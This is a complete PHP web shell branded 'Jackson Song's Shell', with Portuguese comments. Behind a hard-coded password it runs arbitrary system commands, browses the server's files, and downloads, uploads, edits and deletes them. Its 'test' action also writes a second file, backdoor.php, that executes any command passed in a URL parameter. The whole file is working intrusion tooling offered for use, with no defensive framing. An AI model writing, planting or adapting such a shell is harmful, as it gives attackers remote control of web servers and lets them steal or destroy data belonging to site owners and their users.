<?php
// Obter o IP do usuário
$ip = $_SERVER['REMOTE_ADDR'];

// Criar um arquivo com o nome do IP
$file = "access_log_" . $ip . ".txt";
$content = "Acesso realizado em " . date('d/m/Y H:i:s');
file_put_contents($file, $content);

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();
echo "Depuração: iniciou sessão\n";
echo "Не заходите в /-r-o-b-o-t-s.txt\n";

// Senha padrão (mude para algo seguro)
$password = "jackson123";
if (!isset($_SESSION['authenticated']) && isset($_POST['password'])) {
    echo "Depuração: Verificando senha\n";
    if ($_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
        echo "Depuração: Autenticado com sucesso\n";
    } else {
        die("Senha incorreta! <a href='javascript:history.back()'>Voltar</a>");
    }
}
if (!isset($_SESSION['authenticated'])) {
    echo "Depuração: Exibindo login\n";
    echo "<!DOCTYPE html>
    <html>
    <head><title>Jackson Song's Shell - Login</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; }
        .login { margin: 20% auto; width: 300px; padding: 20px; border: 2px solid #00ff00; }
    </style></head>
    <body>
    <div class='login'>
        <h2>Jackson Song's Shell - Login</h2>
        <form method='POST'>
            <input type='password' name='password' placeholder='Digite a senha' style='background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 5px;'><br><br>
            <input type='submit' value='Entrar' style='background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 5px;'>
        </form>
    </div>
    <p style='text-align: center;'><a href='https://www.youtube.com/@Jackson_Songs' style='color: #00ff00;' target='_blank'>Criador</a></p>
    </body></html>";
    exit;
}

echo "Depuração: Usuário autenticado\n";
echo "Depuração: Iniciando renderização HTML\n";
if (isset($_GET['action'])) {
    echo "Depuração: Ação detectada: " . htmlspecialchars($_GET['action']) . "\n";
    echo "<!DOCTYPE html>
    <html>
    <head><title>Jackson Song's Shell</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; border: 2px solid #00ff00; padding: 20px; }
        .directory { background: #333; padding: 5px; margin-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #00ff00; padding: 5px; text-align: left; }
        th { background: #222; }
        .icon { width: 16px; height: 16px; vertical-align: middle; }
        .section { margin: 15px 0; }
        input, textarea, button { background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 5px; margin: 5px 0; }
        a { color: #00ff00; text-decoration: none; }
        a:hover { text-decoration: underline; }
        h1 { font-family: Impact, sans-serif; font-size: 2.5em; text-align: center; }
    </style></head>
    <body>
    <div class='container'>
        <h1>Jackson Song's Shell</h1>
        <p><a href='https://www.youtube.com/@Jackson_Songs' target='_blank'>Créditos: Jackson Songs</a></p>
        <div class='directory'>
            Directory: " . htmlspecialchars(getcwd()) . " <a href='?action=ls'>change</a>
        </div>";

    switch ($_GET['action']) {
        case 'cmd':
            echo "Depuração: Entrou em cmd\n";
            if (isset($_POST['command'])) {
                echo "Depuração: Executando comando: " . htmlspecialchars($_POST['command']) . "\n";
                @system($_POST['command']) ?: @passthru($_POST['command']);
            }
            echo "<div class='section'>
                <h3>Executar Comando</h3>
                <form method='POST'>
                    <input type='text' name='command' placeholder='Digite um comando (ex.: whoami, ls)' required>
                    <input type='submit' value='Executar'>
                </form>
            </div>";
            break;

        case 'ls':
            echo "Depuração: Entrou em ls\n";
            $dir = isset($_POST['dir']) ? realpath($_POST['dir']) : getcwd();
            if ($dir === false) $dir = getcwd();
            echo "Depuração: Diretório atual: $dir\n";
            echo "<div class='section'><h3>Lista de Arquivos</h3>
            <table>
                <tr>
                    <th></th>
                    <th>Filename</th>
                    <th>Size</th>
                    <th>Permission</th>
                    <th>Owner</th>
                    <th>Group</th>
                    <th>Functions</th>
                </tr>";
            if (function_exists('scandir') && is_dir($dir)) {
                echo "Depuração: scandir disponível e diretório válido\n";
                $files = scandir($dir);
                if ($files !== false) {
                    foreach ($files as $file) {
                        if ($file != "." && $file != "..") {
                            $path = $dir . '/' . $file;
                            $size = is_file($path) ? filesize($path) . ' B' : (is_dir($path) ? '4096 B' : '-');
                            $perm = function_exists('fileperms') ? substr(sprintf('%o', fileperms($path)), -4) : '-';
                            $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($path))['name'] : '-';
                            $group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($path))['name'] : '-';
                            $icon = is_dir($path) ? '📁' : '📄';
                            echo "<tr>
                                <td><span class='icon'>$icon</span></td>
                                <td>$file</td>
                                <td>$size</td>
                                <td>$perm</td>
                                <td>$owner</td>
                                <td>$group</td>
                                <td><a href='?action=download&file=$path'>Download</a> | <a href='?action=delete&file=$path'>Delete</a></td>
                            </tr>";
                        }
                    }
                    echo "<tr><td colspan='7'><a href='?action=ls&dir=" . dirname($dir) . "'>..</a> | <a href='?action=ls&dir=$dir'>.</a></td></tr>";
                } else {
                    echo "Depuração: Falha ao ler diretório com scandir\n";
                    echo "<tr><td colspan='7'>Erro ao listar diretório!</td></tr>";
                }
            } else {
                echo "Depuração: scandir não disponível ou diretório inválido\n";
                echo "<tr><td colspan='7'>Diretório inválido ou função indisponível!</td></tr>";
            }
            echo "</table><form method='POST'>
                <input type='text' name='dir' placeholder='Digite o diretório (ex.: /var/www)' value='$dir'>
                <input type='submit' value='Listar'>
            </form></div>";
            break;

        case 'info':
            echo "Depuração: Entrou em info\n";
            echo "<div class='section'><h3>Informações do Sistema</h3><pre>";
            echo "Servidor: " . php_uname() . "\n";
            echo "PHP Version: " . phpversion() . "\n";
            echo "</pre></div>";
            break;

        case 'download':
            echo "Depuração: Entrou em download\n";
            if (isset($_GET['file'])) {
                $file = $_GET['file'];
                if (file_exists($file)) {
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                    readfile($file);
                    exit;
                } else {
                    echo "<p>Arquivo não encontrado!</p>";
                }
            }
            break;

        case 'upload':
            echo "Depuração: Entrou em upload\n";
            if (isset($_FILES['file'])) {
                $target_dir = "uploads/";
                if (!file_exists($target_dir)) @mkdir($target_dir, 0755, true);
                $target_file = $target_dir . basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
                    echo "<p>Arquivo enviado para: $target_file</p>";
                } else {
                    echo "<p>Erro ao enviar o arquivo!</p>";
                }
            }
            echo "<div class='section'><h3>Upload de Arquivo</h3>
                <form method='POST' enctype='multipart/form-data'>
                    <input type='file' name='file' required>
                    <input type='submit' value='Enviar'>
                </form></div>";
            break;

        case 'delete':
            echo "Depuração: Entrou em delete\n";
            if (isset($_GET['file'])) {
                $file = $_GET['file'];
                if (file_exists($file) && @unlink($file)) {
                    echo "<p>Arquivo $file deletado com sucesso!</p>";
                } else {
                    echo "<p>Falha ao deletar $file!</p>";
                }
            }
            echo "<a href='?action=ls&dir=" . dirname(getcwd()) . "'>Voltar à lista</a>";
            break;

        case 'edit':
            echo "Depuração: Entrou em edit\n";
            if (isset($_POST['file']) && isset($_POST['content'])) {
                $file = $_POST['file'];
                if (@file_put_contents($file, $_POST['content']) !== false) {
                    echo "<p>Arquivo $file editado com sucesso!</p>";
                } else {
                    echo "<p>Falha ao editar $file!</p>";
                }
            }
            $content = isset($_POST['file']) && file_exists($_POST['file']) ? file_get_contents($_POST['file']) : '';
            echo "<div class='section'><h3>Editar Arquivo</h3>
                <form method='POST'>
                    <input type='text' name='file' placeholder='Caminho do arquivo (ex.: index.php)' required><br>
                    <textarea name='content' rows='10' cols='50' placeholder='Conteúdo do arquivo'>$content</textarea><br>
                    <input type='submit' value='Salvar'>
                </form></div>";
            break;

        case 'test':
            echo "Depuração: Entrou em test\n";
            $backdoor_file = "backdoor.php";
            $backdoor_content = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>';
            if (@file_put_contents($backdoor_file, $backdoor_content) !== false) {
                echo "<p>Backdoor criado em $backdoor_file! Acesse com ?cmd=[comando]</p>";
            } else {
                echo "<p>Falha ao criar backdoor!</p>";
            }
            break;

        default:
            echo "Depuração: Ação não reconhecida: " . htmlspecialchars($_GET['action']) . "\n";
            echo "<p>Ação inválida ou não implementada.</p>";
    }

    echo "<div class='section'>
        <h3>Menu</h3>
        <a href='?action=cmd'>Executar Comando</a> | 
        <a href='?action=ls'>Listar Arquivos</a> | 
        <a href='?action=info'>Informações do Sistema</a> | 
        <a href='?action=download'>Baixar Arquivo</a> | 
        <a href='?action=upload'>Upload</a> | 
        <a href='?action=delete'>Deletar</a> | 
        <a href='?action=edit'>Editar</a> | 
        <a href='?action=test'>Test (Backdoor)</a> | 
        <a href='https://www.youtube.com/@Jackson_Songs' target='_blank'>Créditos</a>
    </div>
    <p style='text-align: center;'><a href='https://www.youtube.com/@Jackson_Songs' target='_blank'>Criado por Jackson Songs</a></p>
    </div></body></html>";
    exit;
} else {
    echo "Depuração: Nenhuma ação especificada\n";
    echo "<!DOCTYPE html>
    <html>
    <head><title>Jackson Song's Shell</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; border: 2px solid #00ff00; padding: 20px; }
        .directory { background: #333; padding: 5px; margin-bottom: 10px; }
        .section { margin: 15px 0; }
        input, button { background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 5px; margin: 5px 0; }
        a { color: #00ff00; text-decoration: none; }
        a:hover { text-decoration: underline; }
        h1 { font-family: Impact, sans-serif; font-size: 2.5em; text-align: center; }
    </style></head>
    <body>
    <div class='container'>
        <h1>Jackson Song's Shell</h1>
        <p><a href='https://www.youtube.com/@Jackson_Songs' target='_blank'>Créditos: Jackson Songs</a></p>
        <div class='directory'>
            Directory: " . htmlspecialchars(getcwd()) . " <a href='?action=ls'>change</a>
        </div>
        <div class='section'>
            <p>Escolha uma ação no menu abaixo.</p>
        </div>
        <div class='section'>
            <h3>Menu</h3>
            <a href='?action=cmd'>Executar Comando</a> | 
            <a href='?action=ls'>Listar Arquivos</a> | 
            <a href='?action=info'>Informações do Sistema</a> | 
            <a href='?action=download'>Baixar Arquivo</a> | 
            <a href='?action=upload'>Upload</a> | 
            <a href='?action=delete'>Deletar</a> | 
            <a href='?action=edit'>Editar</a> | 
            <a href='?action=test'>Test (Backdoor)</a> | 
            <a href='https://www.youtube.com/@Jackson_Songs' target='_blank'>Créditos</a>
        </div>
        <p style='text-align: center;'><a href='https://www.youtube.com/@Jackson_Songs' target='_blank'>Criado por Jackson Songs</a></p>
    </div></body></html>";
}
?>